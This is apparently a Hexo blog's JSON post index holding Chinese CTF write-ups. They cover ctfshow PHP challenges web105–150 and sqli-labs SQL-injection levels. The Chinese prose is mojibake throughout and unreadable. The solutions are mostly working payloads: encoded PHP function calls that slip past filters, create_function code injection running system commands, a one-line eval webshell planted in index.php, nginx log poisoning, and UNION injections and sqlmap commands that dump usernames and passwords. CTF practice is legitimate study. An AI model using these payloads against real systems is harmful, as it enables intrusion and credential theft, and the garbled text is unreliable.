12stripos(string,find,start)è¿”å›å€¼ï¼šè¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å›FALSEã€‚æ³¨é‡Šï¼šå­—ç¬¦ä¸²ä½ç½®ä»0å¼€å§‹ï¼Œä¸æ˜¯ä»1å¼€å§‹ çœ‹åˆ«äººçš„wpç»•è¿‡çš„å§¿åŠ¿æœ‰å¾ˆå¤šå•Šï¼Œä½†æ˜¯æ€ä¹ˆä¸€åˆ°æˆ‘è¿™é‡Œå°±å¤±çµäº†å•Šã€‚åªèƒ½ç”¨phpä¼ªåè®®payload: 1?f=php://filter/|ctfshow/resource=flag.php #ä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„è¿‡æ»¤å™¨ web130PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ 12345678import requestsurl=&#x27;#url&#x27;data=&#123; &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;ctfshow&#x27;&#125;r=requests.post(url=url,data=data).textprint(r) æˆ–è€…æ•°ç»„ç»•è¿‡ 1f[]=1 #striposåº”ç”¨äºæ•°ç»„çš„æ—¶å€™ä¼šè¿”å›nullï¼Œnull!==false æˆ–è€… 1f=ctfshow /sæ¨¡å¼ä¸‹ï¼Œ.åŒ¹é…ä»»æ„å­—ç¬¦ï¼Œ+è¡¨ç¤ºé‡å¤ä¸€æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œæ²¡é”™æ˜¯è‡³å°‘ä¸€æ¬¡ï¼è€Œåé¢åŠ ä¸ª?è¡¨ç¤ºæ‡’æƒ°æ¨¡å¼ï¼Œ+?è¡¨ç¤ºé‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ã€‚å½“ç„¶æ‡’æƒ°æ¨¡å¼å¹¶ä¸å½±å“è§£é¢˜æ€è·¯ï¼Œæ€»ä¹‹å°±æ˜¯ctfshowå‰é¢å¿…é¡»å¾—æœ‰å­—ç¬¦æ‰èƒ½åŒ¹é…åˆ°ï¼Œæ‰€ä»¥ç›´æ¥f=ctfshowå°±å¯ä»¥äº†ã€‚ web13112345678import requestsurl=&#x27;#url&#x27;data=&#123; &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;36Dctfshow&#x27;&#125;r=requests.post(url=url,data=data).textprint(r) web132ä¸€æ‰“å¼€ç½‘ç«™æˆ‘éƒ½æƒŠå‘†äº†ï¼Œå¥½é«˜çº§çš„æ„Ÿè§‰ã€‚ç„¶åè®¿é—®robots.txtæœ‰/adminè®¿é—®å°±èƒ½çœ‹åˆ°æºç ã€‚å•Š~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~è¿™ä¸€é¢˜å¥½ç®€å•å•Šã€‚ 1$code === mt_rand(1,0x36D) &amp;&amp; $password === $flag åªè¦è®©è¿™ä¸ªä¸ºfalseï¼Œusername=adminå’Œcode=adminå°±è¡Œpayloadï¼š 1?username=admin&amp;code=admin&amp;password=1 web134parse_str()å‡½æ•° 1æŠŠæŸ¥è¯¢å­—ç¬¦è§£æåˆ°å˜é‡ ectract()å‡½æ•° 1ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥å½“å‰çš„ç¬¦å·è¡¨ 1phpå˜é‡è¦†ç›– åˆ©ç”¨ç‚¹æ˜¯ extract($_POST); è¿›è¡Œè§£æ$_POSTæ•°ç»„ã€‚ å…ˆå°†GETæ–¹æ³•è¯·æ±‚çš„è§£ææˆå˜é‡ï¼Œç„¶ååœ¨åˆ©ç”¨extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚ 123456789101112131415å››ä¸ªå˜é‡çš„ä»‹ç»ï¼š1.$_SERVER[&quot;QUERY_STRING&quot;]è¯´æ˜ï¼šæŸ¥è¯¢(query)çš„å­—ç¬¦ä¸²2.$_SERVER[&quot;REQUEST_URI&quot;]è¯´æ˜ï¼šè®¿é—®æ­¤é¡µé¢æ‰€éœ€çš„URI 3.$_SERVER[&quot;SCRIPT_NAME&quot;]è¯´æ˜ï¼šåŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„ 4.$_SERVER[&quot;PHP_SELF&quot;] ä¾‹å¦‚ 123456789http://www.xxx.com/?p=222 (é™„å¸¦æŸ¥è¯¢)ç»“æœï¼š$_SERVER[&quot;QUERY_STRING&quot;]==&gt;â€œp=222â€;$_SERVER[&quot;REQUEST_URI&quot;] ==&gt;&quot;/?p=222&quot;;$_SERVER[&quot;SCRIPT_NAME&quot;] ==&gt;&quot;/index.php&quot;;$_SERVER[&quot;PHP_SELF&quot;] ==&gt;&quot;/index.php&quot;; payload: 1?_POST[key1]=36d&amp;_POST[key2]=36d web136è·Ÿç€å¤§ä½¬å­¦åˆ°äº†å¥½å¤šå•Šåœ¨linuxé‡Œå¯ä»¥ç”¨teeå‘½ä»¤è¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶payload: 12?c=ls /|tee 1 #æŠŠæ ¹ç›®å½•é‡Œçš„å†…å®¹å†™è¿›1æ–‡ä»¶é‡Œ?c=tac /f149_15_h3r3|tee 2 web137 1call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ è€ƒå¯Ÿè°ƒç”¨ç±»ä¸­çš„å‡½æ•° 123phpä¸­ -&gt;ä¸:: è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«-&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•. payload: 1POST:ctfshow=ctfshow::getFlag web138ç›¸å½“äºæŠŠå†’å·ç¦ç”¨äº†ï¼Œä½†æ˜¯call_user_funcè¿˜å¯ä»¥ä¼ æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ç±»åæˆ–è€…ç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ç±»çš„æ–¹æ³•åï¼ŒåŒæ ·å¯ä»¥è°ƒç”¨ã€‚payload: 1POST:ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag web139å¤ªéš¾äº†ï¼Œè„šæœ¬çœ‹ä¸æ‡‚ï¼Œä»¥åæœ‰æœºä¼šäº†å†åš web140å¯ä»¥çœ‹åˆ°åªè¦æˆ‘ä»¬è®©intval($code)ä¸º0å°±å¯ä»¥äº†intvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ intval(â€˜aâ€™)==0 intval(â€˜.â€™)==0 intval(â€˜/â€˜)==0æ‰€ä»¥æ–¹æ³•å°±æŒºå¤šäº†payloadï¼š 1f1=chr&amp;f2=chr æˆ‘æ„Ÿè§‰éšä¾¿æä¸€ç‚¹å‡½æ•°æ”¾ä¸Šå»éƒ½å¯ä»¥ã€‚ web141ä¼ å…¥çš„v3å¿…é¡»æ˜¯éå•è¯å­—ç¬¦æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“ï¼ˆå«ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ã€å¼‚æˆ–ã€æˆ–ã€å–åã€è‡ªå¢è„šæœ¬ï¼‰payloadï¼š 1?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)- web142emmmmmmmmmmmmï¼Œè®©æˆ‘å¤ªå¥¶æ¥éƒ½ä¼šåšpayload: 1?v1=0 web143 1?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1 web144å¯¹v3çš„é•¿åº¦è¿›è¡Œäº†é™åˆ¶,æ‰€ä»¥åœ¨v2ä¸Šä¸‹æ‰‹payload: 1?v1=1&amp;v2=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)&amp;v3=1 web145å¯ä»¥ç”¨ä¸‰ç›®è¿ç®—ç¬¦ 1eval(&quot;return 1?phpinfo():1;&quot;); #è¿™æ˜¯å¯ä»¥è¿è¡Œçš„ payload: 1?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5): web146è¿‡æ»¤äº†ï¼šæ²¡åŠæ³•ç”¨ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¯ä»¥ç”¨ç­‰å·å’Œä½è¿ç®—ç¬¦\\ 1eval(&quot;return 1==phpinfo()||1;&quot;); #è¿™ä¹Ÿå¯ä»¥è¿è¡Œ payload: 1?v1=1&amp;v2=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|| web147å…·ä½“åŸç†çœ‹è¿™ä¸ª 1234567create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)ç±»ä¼¼äºfunction f($a) &#123; echo $a.&quot;123&quot;;&#125; payload: 12GET:?show=&#125;system(&quot;tac flag.php&quot;);/*POST:ctf=\\create_function web148æ²¡è¿‡æ»¤å¼‚æˆ–è¿˜å¯ä»¥ç”¨å¼‚æˆ–payload: 1?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;); web149é¢„æœŸè§£æ˜¯æ¡ä»¶ç«äº‰ï¼Œå¯æ˜¯æˆ‘æäº†åŠå¤©ä¹Ÿä¸è¡Œï¼Œå°±ç›´æ¥åœ¨index.phpé‡Œæ”¹äº†payload: 12GET: ?ctf=index.phpPOST: show=&lt;?php @eval($_POST[a];)?&gt; ç„¶åç”¨èšå‰‘è¿æ¥ã€‚ web1501234567891011121314151617181920212223242526272829303132333435363738394041424344include(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#è¿‡æ»¤å­—ç¬¦$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125; éé¢„æœŸæ—¥å¿—æ–‡ä»¶åŒ…å«å†™ä¸€å¥è¯ä¿®æ”¹user_agentå†…å®¹ä¸ºä¸€å¥è¯ï¼Œç„¶ååŒ…å«/var/log/nginx/access.logå°±å¯ä»¥ä½¿ç”¨æˆ‘ä»¬å†™çš„ä¸€å¥è¯äº†ã€‚é¦–å…ˆè®¿é—®index.php ä¿®æ”¹user_agentä¸º","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"åˆ·é¢˜","slug":"ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"ctfshow/åˆ·é¢˜/phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow webå…¥é—¨110~125","slug":"ctfshow-webå…¥é—¨110","date":"2023-03-17T05:05:46.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/03/17/ctfshow-webå…¥é—¨110/","permalink":"https://lvzhouhang.xyz/2023/03/17/ctfshow-web%E5%85%A5%E9%97%A8110/","excerpt":"web110è€ƒå¯ŸFilesystemIteratorã€‚getcwd()å‡½æ•° è·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚payload: 1?v1=FilesystemIterator&amp;v2=getcwd ç¼ºé™·æ˜¯å¦‚æœflagçš„æ–‡ä»¶ä¸åœ¨ç¬¬ä¸€ä½çš„è¯ï¼Œå°±ä¸èƒ½å¾—åˆ°è¿™ä¸ªæ–‡ä»¶åã€‚","text":"web110è€ƒå¯ŸFilesystemIteratorã€‚getcwd()å‡½æ•° è·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚payload: 1?v1=FilesystemIterator&amp;v2=getcwd ç¼ºé™·æ˜¯å¦‚æœflagçš„æ–‡ä»¶ä¸åœ¨ç¬¬ä¸€ä½çš„è¯ï¼Œå°±ä¸èƒ½å¾—åˆ°è¿™ä¸ªæ–‡ä»¶åã€‚ web111è€ƒå¯Ÿ å…¨å±€å˜é‡GLOBALSè¦æ‰§è¡Œè¿™ä¸€æ®µå‡½æ•°ï¼Œv1è¦ç­‰äºctfshow 123if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123; getFlag($v1,$v2); &#125; ç„¶åå†å°†v2çš„å€¼èµ‹ç»™v1ï¼Œå†æ¥ç€getFlagå‡½æ•°ï¼Œæ‰“å°v1ï¼Œv1ä¸ºå…¨å±€å˜é‡çš„æ—¶å€™ï¼Œå³å¯æ‰“å°å‡ºflagã€‚payload: 1?v1=ctfshow&amp;v2=GLOBALS web112payload: 1234php://filter/resource=flag.phpphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.phpphp://filter/read=convert.quoted-printable-encode/resource=flag.phpcompress.zlib://flag.php php://filterçš„å„ç§è¿‡æ»¤å™¨ web113payload:å¯ä»¥ç”¨zlibä¼ªåè®® 1?file=compress.zlib://flag.php ä¹Ÿå¯ä»¥ç”¨/proc/self/root 12345?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php procç›®å½•çš„åº”ç”¨compressï¼Œå’Œéé¢„æœŸéƒ½è¢«ç¦äº†ï¼Œä½†æ˜¯ä¼ªåè®®æ”¾å‡ºæ¥äº†ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä¼ªåè®®è¯»payload: 1?file=php://filter/resource=flag.php web115è€ƒå¯Ÿç‚¹ï¼štrimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡ 12345678910111213è¯­æ³•trim(string,charlist)å‚æ•° æè¿°string å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚charlist å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™ç§»é™¤ä¸‹åˆ—æ‰€æœ‰å­—ç¬¦ï¼š&quot;\\0&quot; - NULL&quot;\\t&quot; - åˆ¶è¡¨ç¬¦&quot;\\n&quot; - æ¢è¡Œ&quot;\\x0B&quot; - å‚ç›´åˆ¶è¡¨ç¬¦&quot;\\r&quot; - å›è½¦&quot; &quot; - ç©ºæ ¼ çœ‹å¸ˆå‚…çš„wpæ‰èƒ½åšå‡ºæ¥ï¼Œåœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ 12345678&lt;?phpfor($i=0;$i&lt;=128;$i++)&#123; $str=chr($i).&quot;1&quot;; if(is_numeric($str)&amp;&amp; trim($str)!==&#x27;1&#x27;)&#123; echo urlencode(chr($i)).&quot;&lt;br&gt;&quot;; &#125;&#125; å¯ä»¥ç”¨%0cæ¢é¡µï¼Œpayload: 1?num=%0c36 web123 1GETæˆ–POSTçš„æ–¹å¼ä¼ è¿›å»çš„å˜é‡åï¼Œä¼šè‡ªåŠ¨å°†ç©ºæ ¼ + . [ è½¬æ¢ä¸º_,æƒ³æ„é€ å‡º.ï¼Œéœ€è¦å‰é¢å¸¦ä¸Š[ï¼Œåé¢ç”¨.å°±å¯ä»¥ä¸å˜æˆ_ã€‚ payload: 1POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag web125 123456789101112131ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹ ç¬¬ä¸€ä¸ªå‚æ•°$_SERVER[&#x27;argv&#x27;][0]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°2ã€webç½‘é¡µæ¨¡å¼ä¸‹ åœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹ è®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ è¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™] $argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨ payload: 123payload:get: $fl0g=flag_give_me;post: CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0])","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"åˆ·é¢˜","slug":"ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"ctfshow/åˆ·é¢˜/phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow webå…¥é—¨105~109","slug":"ctfshow-webå…¥é—¨105","date":"2023-02-26T11:25:50.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/02/26/ctfshow-webå…¥é—¨105/","permalink":"https://lvzhouhang.xyz/2023/02/26/ctfshow-web%E5%85%A5%E9%97%A8105/","excerpt":"1234foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; è¿™ä¸€æ®µè¯´getä¼ çš„å€¼ä¸èƒ½ç­‰äºerrorã€‚ 1234foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; è¿™ä¸€æ®µè¯´POSTä¼ çš„å€¼ä¸èƒ½ç­‰äºflagã€‚ 123if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125; è¿™ä¸€æ®µè¯´POSTä¼ çš„å€¼ä¸ç­‰äºflagçš„è¯è¾“å‡ºå˜é‡errorã€‚payload: 12GET:?a=flagPOST:error=a","text":"1234foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; è¿™ä¸€æ®µè¯´getä¼ çš„å€¼ä¸èƒ½ç­‰äºerrorã€‚ 1234foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; è¿™ä¸€æ®µè¯´POSTä¼ çš„å€¼ä¸èƒ½ç­‰äºflagã€‚ 123if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125; è¿™ä¸€æ®µè¯´POSTä¼ çš„å€¼ä¸ç­‰äºflagçš„è¯è¾“å‡ºå˜é‡errorã€‚payload: 12GET:?a=flagPOST:error=a web106è¿™é“é¢˜å°±æ¯”web105å¤šä¸€ä¸ªæ¯”è¾ƒã€‚payload: 12GET:v2[]=1POST:v1[]=2 web107 1234parse_str(string,array)æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚stringå¿…é€‰ã€‚è§„å®šè¦è§£æçš„å­—ç¬¦ä¸²arrayå¯é€‰ã€‚è§„å®šå­˜å‚¨å˜é‡çš„æ•°ç»„çš„åç§°ã€‚ é¢˜ç›®å°±æ˜¯æŠŠv1çš„å€¼èµ‹ç»™v2ï¼Œç„¶åè®©v2çš„å€¼å’Œv3çš„MD5å€¼ç›¸åŒã€‚payload: 12GET:?v3=aPOST:v1=flag=0cc175b9c0f1b6a831c399e269772661 MD5æ²¡åŠæ³•å¤„ç†æ•°ç»„ã€‚ 12GET:?v3=aPOST:v1= #ç©º web108è¿æ¥ä¸åˆ°æœåŠ¡å™¨â€¦.. web109æ‰¾ä¸åˆ°æœåŠ¡å™¨â€¦â€¦","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"åˆ·é¢˜","slug":"ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"ctfshow/åˆ·é¢˜/phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"Hello World","slug":"hello-world","date":"2023-02-26T09:53:28.226Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2023/02/26/hello-world/","permalink":"https://lvzhouhang.xyz/2023/02/26/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"sqli-labs","slug":"sqli-labs","date":"2023-02-20T12:24:45.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2023/02/20/sqli-labs/","permalink":"https://lvzhouhang.xyz/2023/02/20/sqli-labs/","excerpt":"less-1çœ‹æŠ¥é”™å¯çŸ¥ï¼Œè¿™æ˜¯é—­åˆå•å¼•å·ã€‚ 1234?id=1&#x27;order by 3 -- - #ç¡®å®šé‚£ä¸ªå­—æ®µæœ‰å›æ˜¾?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- - #æŸ¥è¯¢è¡¨å?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - #æŸ¥è¯¢åˆ—å?id=-1&#x27;union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - #æŸ¥è¯¢å½“å‰æ•°æ®åº“userè¡¨é‡Œé¢çš„usernameå’Œpasswordã€‚","text":"less-1çœ‹æŠ¥é”™å¯çŸ¥ï¼Œè¿™æ˜¯é—­åˆå•å¼•å·ã€‚ 1234?id=1&#x27;order by 3 -- - #ç¡®å®šé‚£ä¸ªå­—æ®µæœ‰å›æ˜¾?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- - #æŸ¥è¯¢è¡¨å?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - #æŸ¥è¯¢åˆ—å?id=-1&#x27;union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - #æŸ¥è¯¢å½“å‰æ•°æ®åº“userè¡¨é‡Œé¢çš„usernameå’Œpasswordã€‚ ç”¨sqlmapæ›´ç®€å• 12345sqlmap -u &quot;ip?id=1&quot;sqlmap -u &quot;ip?id=1&quot; -dbs #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“sqlmap -u &quot;ip?id=1&quot; -D security -tables #åˆ—å‡ºå½“å‰æ•°æ®åº“é‡Œçš„è¡¨sqlmap -u &quot;ip?id=1&quot; -D security -T users -columns #åˆ—å‡ºè¡¨é‡Œçš„åˆ—sqlmap -u &quot;ip?id=1&quot; -D security -T users -C username,password --dump #è·å–è¡¨é‡Œçš„æ•°æ® less-2è¿™ä¸€é¢˜å°±ä¸ç”¨é—­åˆï¼Œå‰©ä¸‹çš„å’Œç¬¬ä¸€é¢˜ä¸€æ ·ã€‚ 1234?id=1 order by 3 -- - ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - ?id=-1 union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - less-3çœ‹é”™è¯¯æç¤ºå¯çŸ¥ï¼Œéœ€è¦ç”¨&#39;)æ¥é—­åˆï¼Œå‰©ä¸‹çš„å’Œç¬¬ä¸€é¢˜ä¸€æ ·ã€‚ 1234?id=1&#x27;) order by 3 -- - ?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - ?id=-1&#x27;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - less-4çœ‹é”™è¯¯æç¤ºï¼Œå¯çŸ¥é—­åˆæ–¹å¼æ˜¯&quot;)ï¼Œä½†æ˜¯å•å¼•å·ä¸ä¼šæŠ¥é”™,å‰©ä¸‹çš„å’Œç¬¬ä¸€é¢˜ä¸€æ ·ã€‚ 1234?id=1&quot;) order by 3 -- - ?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - ?id=-1&quot;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - less-5æ ¹æ®é”™è¯¯å¯ä»¥åˆ¤æ–­æ˜¯å•å¼•å·æŠ¥é”™ã€‚è”åˆæ³¨å…¥ä¹Ÿæ²¡æœ‰åŠæ³•ç”¨ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚extractvalueå‡½æ•°payload:id=â€™and(select extractvalue(â€œanythingâ€,concat(â€˜~â€™,(selectè¯­å¥)))) 12345å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸² payloadï¼š 1234567891011?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,(select database()))))-- - 